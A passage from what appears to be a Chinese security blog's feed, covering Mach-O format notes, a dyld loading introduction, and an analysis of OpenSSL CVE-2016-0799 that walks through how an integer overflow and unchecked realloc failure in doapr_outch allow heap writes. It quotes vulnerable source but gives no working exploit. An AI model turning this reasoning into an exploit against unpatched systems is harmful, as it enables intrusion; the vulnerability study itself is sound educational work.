attributes)*/</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved1;	<span class="comment">/* reserved (for offset or index) */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved2;	<span class="comment">/* reserved (for count or sizeof) */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved3;	<span class="comment">/* reserved */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>除了同样有帮助内存映射的变量外，在了解Mach-O格式的时候，只需要知道不同的Section有着不同的作用就可以了。</p>
<table>
<thead>
<tr>
<th>Section</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>__text</td>
<td>代码</td>
</tr>
<tr>
<td>__cstring</td>
<td>硬编码的字符串</td>
</tr>
<tr>
<td>__const</td>
<td>const 关键词修饰过的变量</td>
</tr>
<tr>
<td>__DATA.__bss</td>
<td>bss段</td>
</tr>
</tbody>
</table>
<p>因为section类型已经是最小的分类了，还有更多复杂section段就不一一例举了，遇到没见过的section类型可以自行查找Apple文档。</p>
<h1 id="0x05_小结">0x05 小结</h1><p>通过对Mach-O格式的仔细分析，可以更好的理解Mach-O文件的加载过程，为研究dyld或者其他OS X系统下的模块打好基础。</p>
<h1 id="参考">参考</h1><p>1.mach-o文件加载的全过程(1)</p>
<p><a href="http://dongaxis.github.io/2015/01/01/mac-o%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B-1/" target="_blank" rel="external">http://dongaxis.github.io/2015/01/01/mac-o%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B-1/</a></p>
<p>2.Mach-O 可执行文件</p>
<p><a href="http://objccn.io/issue-6-3/" target="_blank" rel="external">http://objccn.io/issue-6-3/</a></p>
<p>3.iPhone Mach-O文件格式与代码签名</p>
<p><a href="http://zhiwei.li/text/2012/02/15/iphone-mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D/" target="_blank" rel="external">http://zhiwei.li/text/2012/02/15/iphone-mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%B8%8E%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D/</a></p>
<p>4.Dynamic Linking of Imported Functions in Mach-O</p>
<p><a href="http://www.codeproject.com/Articles/187181/Dynamic-Linking-of-Imported-Functions-in-Mach-O" target="_blank" rel="external">http://www.codeproject.com/Articles/187181/Dynamic-Linking-of-Imported-Functions-in-Mach-O</a></p>
<p>5.otool详解Mach-o文件头部</p>
<p><a href="http://www.mc2lab.com/?p=68" target="_blank" rel="external">http://www.mc2lab.com/?p=68</a></p>
<h1 id="PS:">PS:</h1><p>更多文章可以在我的学习分享博客<a href="http://BLOGIMAGE/" target="_blank" rel="external">http://BLOGIMAGE/</a></p>
<p>希望可以多多交流，不足之处还希望大家可以给与指正：）</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
<p>人生无根蒂，飘如陌上尘。 分散逐风转，此已非常身。</p>
<p>— 陶渊明 《杂诗》</p>
</blockquote>
<p><code>mach-o</code>格式是OS X系统上的可执行文件格式，类似于windows的<code>PE</code>与linux的<code>ELF</code>，如果不彻底搞清楚<code>mach-o</code>的格式与相关知识，去做其他研究，无异于建造空中阁楼。</p>
<p>每个Mach-O文件斗包含一个Mach-O头，然后是载入命令(Load Commands),最后是数据块(Data)。</p>
<p>接下来就对整个Mach-O的格式做出详细的分析。</p>]]>
    
    </summary>
    
      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
    
      <category term="osx" scheme="http://yoursite.com/tags/osx/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-0799简单分析]]></title>
    <link href="http://yoursite.com/2016/03/03/CVE-2016-0799%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2016/03/03/CVE-2016-0799简单分析/</id>
    <published>2016-03-03T16:12:47.000Z</published>
    <updated>2016-03-24T03:35:35.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><p>最近openssl又除了一系列问题，具体可以看<a href="https://drownattack.com/#faq-practical" target="_blank" rel="external">这里</a>。<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0799" target="_blank" rel="external">CVE-2016-0799</a>只是其中一个比较简单的漏洞。造成漏洞的原因主要有两个。</p>
<ul>
<li><code>doapr_outch</code>中有可能存在整数溢出导致申请内存大小为负数</li>
<li><code>doapr_outch</code>函数在申请内存失败时没有做异常处理</li>
</ul>
<a id="more"></a>
<h1 id="0x01_源码分析">0x01 源码分析</h1><p>首先，去<a href="githun.com">github</a>上找到了这一次漏洞修复的<a href="https://github.com/openssl/openssl/commit/9cb177301fdab492e4cfef376b28339afe3ef663" target="_blank" rel="external">commit</a>，可以看到主要修改的是<code>doapr_outch</code>函数。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-0799/diff.png" alt="diff"></p>
<p>有了一个大致的了解之后，将代码切换到bug修复之前的版本。函数源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">697</span> <span class="keyword">static</span> <span class="keyword">void</span>                                                     </span><br><span class="line"><span class="number">698</span> doapr_outch(<span class="keyword">char</span> **sbuffer,</span><br><span class="line"><span class="number">699</span>             <span class="keyword">char</span> **buffer, <span class="keyword">size_t</span> *currlen, <span class="keyword">size_t</span> *maxlen, <span class="keyword">int</span> c)</span><br><span class="line"><span class="number">700</span> &#123;</span><br><span class="line"><span class="number">701</span>     <span class="comment">/* If we haven't at least one buffer, someone has doe a big booboo */</span></span><br><span class="line"><span class="number">702</span>     assert(*sbuffer != <span class="literal">NULL</span> || buffer != <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">703</span>             <span class="keyword">if</span> (*buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">704</span>     <span class="comment">/* |currlen| must always be &lt;= |*maxlen| */</span></span><br><span class="line"><span class="number">705</span>     assert(*currlen &lt;= *maxlen);</span><br><span class="line"><span class="number">706</span> </span><br><span class="line"><span class="number">707</span>     <span class="keyword">if</span> (buffer &amp;&amp; *currlen == *maxlen) &#123;</span><br><span class="line"><span class="number">708</span>         *maxlen += <span class="number">1024</span>;</span><br><span class="line"><span class="number">709</span>         <span class="keyword">if</span> (*buffer == <span class="literal">NULL</span>) &#123;   </span><br><span class="line"><span class="number">710</span>             *buffer = OPENSSL_malloc(*maxl</span><br><span class="line"><span class="number">711</span>                 <span class="comment">/* Panic! Can't really do anything sensible. Just return */</span></span><br><span class="line"><span class="number">712</span>                 <span class="keyword">return</span>; <span class="comment">//这里没有做异常处理直接返回了</span></span><br><span class="line"><span class="number">713</span>             &#125;           </span><br><span class="line"><span class="number">714</span>             <span class="keyword">if</span> (*currlen &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">715</span>                 assert(*sbuffer != <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">716</span>                 <span class="built_in">memcpy</span>(*buffer, *sbuffer, *currlen);</span><br><span class="line"><span class="number">717</span>             &#125;           </span><br><span class="line"><span class="number">718</span>             *sbuffer = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">719</span>         &#125; <span class="keyword">else</span> &#123;        </span><br><span class="line"><span class="number">720</span>             *buffer = OPENSSL_realloc(*buffer, *maxlen);</span><br><span class="line"><span class="number">721</span>             <span class="keyword">if</span> (!*buffer) &#123;</span><br><span class="line"><span class="number">722</span>                 <span class="comment">/* Panic! Can't really do anything sensible. Just return */</span></span><br><span class="line"><span class="number">723</span>                 <span class="keyword">return</span>; <span class="comment">//这里没有做异常处理直接返回了</span></span><br><span class="line"><span class="number">724</span>             &#125;           </span><br><span class="line"><span class="number">725</span>         &#125;               </span><br><span class="line"><span class="number">726</span>     &#125;                   </span><br><span class="line"><span class="number">727</span> </span><br><span class="line"><span class="number">728</span>     <span class="keyword">if</span> (*currlen &lt; *maxlen) &#123;</span><br><span class="line"><span class="number">729</span>         <span class="keyword">if</span> (*sbuffer)   </span><br><span class="line"><span class="number">730</span>             (*sbuffer)[(*currlen)++] = (<span class="keyword">char</span>)c;</span><br><span class="line"><span class="number">731</span>         <span class="keyword">else</span>            </span><br><span class="line"><span class="number">732</span>             (*buffer)[(*currlen)++] = (<span class="keyword">char</span>)c;</span><br><span class="line"><span class="number">733</span>     &#125;                   </span><br><span class="line"><span class="number">734</span> </span><br><span class="line"><span class="number">735</span>     <span class="keyword">return</span>;             </span><br><span class="line"><span class="number">736</span> &#125;</span><br></pre></td></tr></table></figure>
<p>我是看完了一篇<a href="https://guidovranken.wordpress.com/2016/02/27/openssl-cve-2016-0799-heap-corruption-via-bio_printf/" target="_blank" rel="external">国外的分析文章</a>之后了解了整个漏洞的流程，这里我就试图反向的思考一下这个漏洞。希望可以提高从代码补丁中寻找重现流程的能力。</p>
<h2 id="1-1_寻找内存改写的方式">1.1 寻找内存改写的方式</h2><p>因为通过补丁已经知道是<code>doapr_outch</code>函数导致的堆腐败问题，所以<code>doapr_outch</code>一定存在改写数据的代码段。可以看到除了728-734行代码是对内存的改写外，没有其他地方操作内存的内容了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">728</span>     <span class="keyword">if</span> (*currlen &lt; *maxlen) &#123;</span><br><span class="line"><span class="number">729</span>         <span class="keyword">if</span> (*sbuffer)   </span><br><span class="line"><span class="number">730</span>             (*sbuffer)[(*currlen)++] = (<span class="keyword">char</span>)c; <span class="comment">//这里</span></span><br><span class="line"><span class="number">731</span>         <span class="keyword">else</span>            </span><br><span class="line"><span class="number">732</span>             (*buffer)[(*currlen)++] = (<span class="keyword">char</span>)c; <span class="comment">//这里</span></span><br><span class="line"><span class="number">733</span>     &#125;</span><br></pre></td></tr></table></figure>
<p>这里改写内存的方式可以用伪代码简单总结一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base[offset]=c</span><br></pre></td></tr></table></figure>
<p>所以想要向指定的内存写入数据的话需要控制<code>base</code>与<code>offset</code>两个参数。而写入的数据是<code>c</code>。如果控制了<code>base</code>与<code>offset</code>那么每次调用函数就可以改写一个字节。</p>
<p>如果是有经验的开发人员可以很容易看出外部在调用的时候一定是循环调用了<code>doapr_outch</code>，看一看函数调用处的代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">425</span> <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line"><span class="number">426</span> fmtstr(<span class="keyword">char</span> **sbuffer,</span><br><span class="line"><span class="number">427</span>        <span class="keyword">char</span> **buffer,</span><br><span class="line"><span class="number">428</span>        <span class="keyword">size_t</span> *currlen,</span><br><span class="line"><span class="number">429</span>        <span class="keyword">size_t</span> *maxlen, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">int</span> flags, <span class="keyword">int</span> min, <span class="keyword">int</span> max)</span><br><span class="line"><span class="number">430</span> &#123;</span><br><span class="line"><span class="number">431</span>     <span class="keyword">int</span> padlen, strln;</span><br><span class="line"><span class="number">432</span>     <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="number">433</span> </span><br><span class="line"><span class="number">434</span>     <span class="keyword">if</span> (value == <span class="number">0</span>)</span><br><span class="line"><span class="number">435</span>         value = <span class="string">"&lt;NULL&gt;"</span>;</span><br><span class="line"><span class="number">436</span>     <span class="keyword">for</span> (strln = <span class="number">0</span>; value[strln]; ++strln) ;</span><br><span class="line"><span class="number">437</span>     padlen = min - strln;</span><br><span class="line"><span class="number">438</span>     <span class="keyword">if</span> (padlen &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">439</span>         padlen = <span class="number">0</span>;</span><br><span class="line"><span class="number">440</span>     <span class="keyword">if</span> (flags &amp; DP_F_MINUS)</span><br><span class="line"><span class="number">441</span>         padlen = -padlen;</span><br><span class="line"><span class="number">442</span> </span><br><span class="line"><span class="number">443</span>     <span class="keyword">while</span> ((padlen &gt; <span class="number">0</span>) &amp;&amp; (cnt &lt; max)) &#123;</span><br><span class="line"><span class="number">444</span>         doapr_outch(sbuffer, buffer, currlen, maxlen, <span class="string">' '</span>);</span><br><span class="line"><span class="number">445</span>         --padlen;</span><br><span class="line"><span class="number">446</span>         ++cnt;</span><br><span class="line"><span class="number">447</span>     &#125;</span><br><span class="line"><span class="number">448</span>     <span class="keyword">while</span> (*value &amp;&amp; (cnt &lt; max)) &#123;</span><br><span class="line"><span class="number">449</span>         doapr_outch(sbuffer, buffer, currlen, maxlen, *value++); <span class="comment">//这里！</span></span><br><span class="line"><span class="number">450</span>         ++cnt;</span><br><span class="line"><span class="number">451</span>     &#125;</span><br><span class="line"><span class="number">452</span>     ...</span><br><span class="line"><span class="number">453</span>  &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，确实是通过循环来改写内存的。</p>
<h2 id="1-2_副作用编程">1.2 副作用编程</h2><blockquote>
<p>函数副作用会给程序设计带来不必要的麻烦，给程序带来十分难以查找的错误，并且降低程序的可读性。严格的函数式语言要求函数必须无副作用。</p>
</blockquote>
<p>副作用编程带来的不必要麻烦有一句更通俗的话可以来说明。<strong>开发一时爽，调试火葬场</strong>。这里再来看一下</p>
<p><code>doapr_outch</code>的函数声明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doapr_outch</span><span class="params">(<span class="keyword">char</span> **, <span class="keyword">char</span> **, size_t *, size_t *, <span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p>从声明不难看出<code>sbuffer</code>，<code>buffer</code>，<code>currlen</code>，<code>maxlen</code>这几个参数在函数第n次运行时候如果被改变了，那么第n+1次运行的时候，这些参数将使用上次改变了的值。</p>
<p>再结合代码写入处内存改写的方式，就可以肯定<code>sbuffer</code>和<code>buffer</code>一定有一个或者全部被改写了，导致进入了意料之外的逻辑。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">728</span>     <span class="keyword">if</span> (*currlen &lt; *maxlen) &#123;</span><br><span class="line"><span class="number">729</span>         <span class="keyword">if</span> (*sbuffer)   </span><br><span class="line"><span class="number">730</span>             (*sbuffer)[(*currlen)++] = (<span class="keyword">char</span>)c; <span class="comment">//这里</span></span><br><span class="line"><span class="number">731</span>         <span class="keyword">else</span>            </span><br><span class="line"><span class="number">732</span>             (*buffer)[(*currlen)++] = (<span class="keyword">char</span>)c; <span class="comment">//这里</span></span><br><span class="line"><span class="number">733</span>     &#125;</span><br></pre></td></tr></table></figure>
<p>因为<code>Malloc</code>或者<code>Realloc</code>出来的地址一定不是可控的，而系统传进来的<code>sbuffer</code>也一定不可控，再结合上面的代码，如果<code>sbuffer</code>或者<code>buffer</code>指向<code>NULL</code>的话，基址就是固定的了。</p>
<p>718行的代码会将<code>sbuffer</code>设置为空指针。而<code>buffer</code>编程空指针只能是申请内存失败的时候。</p>
<p>在结合上728-733行代码，要做到这一步一定要满足的条件是<code>*sbuffer</code>与<code>*buffer</code>都指向<code>NULL</code>，导致代码进入改写<code>*buffer</code>为基址的内存块。其他任何情况都无法做到内存开始地址可控。</p>
<p>所以再分代码，<strong>看流程是否可能将<code>*sbuffer</code>与<code>*buffer</code>赋值为NULL</strong>。</p>
<h2 id="1-3_改写sbuffer与buffer">1.3 改写sbuffer与buffer</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">697</span> <span class="keyword">static</span> <span class="keyword">void</span>                                                     </span><br><span class="line"><span class="number">698</span> doapr_outch(<span class="keyword">char</span> **sbuffer,</span><br><span class="line"><span class="number">699</span>             <span class="keyword">char</span> **buffer, <span class="keyword">size_t</span> *currlen, <span class="keyword">size_t</span> *maxlen, <span class="keyword">int</span> c)</span><br><span class="line"><span class="number">700</span> &#123;</span><br><span class="line"><span class="number">701</span>     <span class="comment">/* If we haven't at least one buffer, someone has doe a big booboo */</span></span><br><span class="line"><span class="number">702</span>     assert(*sbuffer != <span class="literal">NULL</span> || buffer != <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">703</span>             <span class="keyword">if</span> (*buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="number">704</span>     <span class="comment">/* |currlen| must always be &lt;= |*maxlen| */</span></span><br><span class="line"><span class="number">705</span>     assert(*currlen &lt;= *maxlen);</span><br><span class="line"><span class="number">706</span> </span><br><span class="line"><span class="number">707</span>     <span class="keyword">if</span> (buffer &amp;&amp; *currlen == *maxlen) &#123;</span><br><span class="line"><span class="number">708</span>         *maxlen += <span class="number">1024</span>;</span><br><span class="line"><span class="number">709</span>         <span class="keyword">if</span> (*buffer == <span class="literal">NULL</span>) &#123;   </span><br><span class="line"><span class="number">710</span>             *buffer = OPENSSL_malloc(*maxl</span><br><span class="line"><span class="number">711</span>                 <span class="comment">/* Panic! Can't really do anything sensible. Just return */</span></span><br><span class="line"><span class="number">712</span>                 <span class="keyword">return</span>; <span class="comment">//这里没有做异常处理直接返回了</span></span><br><span class="line"><span class="number">713</span>             &#125;           </span><br><span class="line"><span class="number">714</span>             <span class="keyword">if</span> (*currlen &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">715</span>                 assert(*sbuffer != <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">716</span>                 <span class="built_in">memcpy</span>(*buffer, *sbuffer, *currlen);</span><br><span class="line"><span class="number">717</span>             &#125;           </span><br><span class="line"><span class="number">718</span>             *sbuffer = <span class="literal">NULL</span>;<span class="comment">//这里！</span></span><br><span class="line">		...</span><br><span class="line"><span class="number">728</span>     <span class="keyword">if</span> (*currlen &lt; *maxlen) &#123;</span><br><span class="line"><span class="number">729</span>         <span class="keyword">if</span> (*sbuffer)   </span><br><span class="line"><span class="number">730</span>             (*sbuffer)[(*currlen)++] = (<span class="keyword">char</span>)c;</span><br><span class="line"><span class="number">731</span>         <span class="keyword">else</span>            </span><br><span class="line"><span class="number">732</span>             (*buffer)[(*currlen)++] = (<span class="keyword">char</span>)c;</span><br><span class="line"><span class="number">733</span>     &#125;                   </span><br><span class="line"><span class="number">734</span> </span><br><span class="line"><span class="number">735</span>     <span class="keyword">return</span>;             </span><br><span class="line"><span class="number">736</span> &#125;</span><br></pre></td></tr></table></figure>
<p>在循环调用<code>doapr_outch</code>之后，当<code>*currlen == *maxlen</code>成立的时候就会进入内存申请模块，因为<code>*buffer</code>还没有申请过所以进入上面一个分支，申请内存后将<code>*sbuffer</code>设为NULL。</p>
<p>还需要将<code>*buffer</code>设为NULL。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">707</span>     <span class="keyword">if</span> (buffer &amp;&amp; *currlen == *maxlen) &#123;</span><br><span class="line"><span class="number">708</span>         *maxlen += <span class="number">1024</span>;</span><br><span class="line"><span class="number">709</span>         <span class="keyword">if</span> (*buffer == <span class="literal">NULL</span>) &#123;   </span><br><span class="line"><span class="number">710</span>             *buffer = OPENSSL_malloc(*maxl</span><br><span class="line"><span class="number">711</span>                 <span class="comment">/* Panic! Can't really do anything sensible. Just return */</span></span><br><span class="line"><span class="number">712</span>                 <span class="keyword">return</span>; <span class="comment">//这里没有做异常处理直接返回了</span></span><br><span class="line"><span class="number">713</span>             &#125;           </span><br><span class="line"><span class="number">714</span>             <span class="keyword">if</span> (*currlen &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">715</span>                 assert(*sbuffer != <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">716</span>                 <span class="built_in">memcpy</span>(*buffer, *sbuffer, *currlen);</span><br><span class="line"><span class="number">717</span>             &#125;           </span><br><span class="line"><span class="number">718</span>             *sbuffer = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">719</span>         &#125; <span class="keyword">else</span> &#123;        </span><br><span class="line"><span class="number">720</span>             *buffer = OPENSSL_realloc(*buffer, *maxlen);</span><br><span class="line"><span class="number">721</span>             <span class="keyword">if</span> (!*buffer) &#123;</span><br><span class="line"><span class="number">722</span>                 <span class="comment">/* Panic! Can't really do anything sensible. Just return */</span></span><br><span class="line"><span class="number">723</span>                 <span class="keyword">return</span>; <span class="comment">//这里没有做异常处理直接返回了</span></span><br><span class="line"><span class="number">724</span>             &#125;           </span><br><span class="line"><span class="number">725</span>         &#125;               </span><br><span class="line"><span class="number">726</span>     &#125;</span><br></pre></td></tr></table></figure>
<p>再一次<code>*currlen == *maxlen</code>之后，又会进入内存分配阶段，这次会进入<code>Realloc</code>的分支，那么只要<code>realloc</code>失败的话，<code>*buffer</code>就会被赋值为NULL。</p>
<p>最简单的情况就是堆上内存用完了，这个时候buffer就是NULL了，这个时候就可以根据currlen以及后续的c来改写目标地址的数据了。但是堆上内存用完，导致申请内存返回NULL，是一件不可控的事情。</p>
<p>那么除了这种情况，还有什么情况下，realloc会返回NULL呢。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">375</span>    <span class="function"><span class="keyword">void</span> *<span class="title">CRYPTO_realloc</span><span class="params">(<span class="keyword">void</span> *str, <span class="keyword">int</span> num, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">int</span> line)</span></span><br><span class="line">376    </span>&#123;</span><br><span class="line"><span class="number">377</span>        <span class="keyword">void</span> *ret = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">378</span></span><br><span class="line"><span class="number">379</span>        <span class="keyword">if</span> (str == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">380</span>            <span class="keyword">return</span> CRYPTO_malloc(num, file, line);</span><br><span class="line"><span class="number">381</span></span><br><span class="line"><span class="number">382</span>        <span class="keyword">if</span> (num &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="number">383</span>            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>可以注意到在708行，对*maxlen做了增加1024的操作，那么如果maxlen怎么1024之后超过int的范围，就会导致realloc传入的size是一个负数。这个时候buffer就会因为realloc的参数错误被设置为NULL。然后因为出错，函数退出。</p>
<h2 id="1-3_出错不处理">1.3 出错不处理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">448</span>     <span class="keyword">while</span> (*value &amp;&amp; (cnt &lt; max)) &#123;</span><br><span class="line"><span class="number">449</span>         doapr_outch(sbuffer, buffer, currlen, maxlen, *value++); <span class="comment">//这里！</span></span><br><span class="line"><span class="number">450</span>         ++cnt;</span><br><span class="line"><span class="number">451</span>     &#125;</span><br></pre></td></tr></table></figure>
<p>从这里可以看到，<code>*buffer</code>被设置为NULL，返回出来了。但是外面的循环什么都没干，又继续执行了。</p>
<p>这个时候就可以做内存改写了。currlen与c都是与我们传递的字符串相关的，这个很好理解了。</p>
<h1 id="0x02_小结">0x02 小结</h1><ul>
<li>开发过程中出错一定要处理</li>
<li>数据类型不同，在隐形的转换时，一定要小心</li>
</ul>
<p>接下来要做的事情就是根据对漏洞的理解编写一个POC来调试。这样可以加深对漏洞的理解。在开发中也能更好的引以为戒。</p>
<h1 id="0x03_参考">0x03 参考</h1><p>1.OpenSSL CVE-2016-0799: heap corruption via BIO_printf</p>
<p><a href="https://guidovranken.wordpress.com/2016/02/27/openssl-cve-2016-0799-heap-corruption-via-bio_printf/" target="_blank" rel="external">https://guidovranken.wordpress.com/2016/02/27/openssl-cve-2016-0799-heap-corruption-via-bio_printf/</a></p>
<p>PS：</p>
<p>这是我的学习分享博客<a href="http://BLOGIMAGE/" target="_blank" rel="external">http://BLOGIMAGE/</a></p>
<p>欢迎大家来探讨，不足之处还请指正。</p>
<p>​    </p>
<p>​    </p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><p>最近openssl又除了一系列问题，具体可以看<a href="https://drownattack.com/#faq-practical">这里</a>。<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0799">CVE-2016-0799</a>只是其中一个比较简单的漏洞。造成漏洞的原因主要有两个。</p>
<ul>
<li><code>doapr_outch</code>中有可能存在整数溢出导致申请内存大小为负数</li>
<li><code>doapr_outch</code>函数在申请内存失败时没有做异常处理</li>
</ul>]]>
    
    </summary>
    
      <category term="heap" scheme="http://yoursite.com/tags/heap/"/>
    
      <category term="openssl" scheme="http://yoursite.com/tags/openssl/"/>
    
      <category term="CVE" scheme="http://yoursite.com/categories/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[dyld中mach-o文件加载的简单分析]]></title>
    <link href="http://yoursite.com/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2016/03/01/dyld中macho加载的简单分析/</id>
    <published>2016-03-01T22:06:57.000Z</published>
    <updated>2016-03-24T03:35:46.000Z</updated>
    <content type="html"><![CDATA[<p>[TOC]</p>
<h1 id="0x00_内容简介">0x00 内容简介</h1><blockquote>
<p> Les commencements ont des charmes inexprimables.<br> 万物初始，美妙不可名状。</p>
</blockquote>
<p>通过阅读dyld源码，简单的分析macho在dyld中是如何被加载到内存中的。</p>
<a id="more"></a>
<h1 id="0x01_源码分析">0x01 源码分析</h1><p>mach-o的格式和ELF大同小异，具体分析网上可以搜到很多。就不复述了。</p>
<p><a href="https://samhuri.net/posts/2010/01/basics-of-the-mach-o-file-format" target="_blank" rel="external">Basics of the Mach-O file format</a></p>
<p><a href="http://opensource.apple.com/tarballs/dyld/dyld-360.18.tar.gz" target="_blank" rel="external">dyld源码下载</a></p>
<h1 id="1-1_数据结构">1.1 数据结构</h1><h3 id="1-1-1_macho_header">1.1.1 macho_header</h3><p>这个数据结构提供了对mach-o文件的头部做操作的API，函数都很简单不需要做过多的解释。</p>
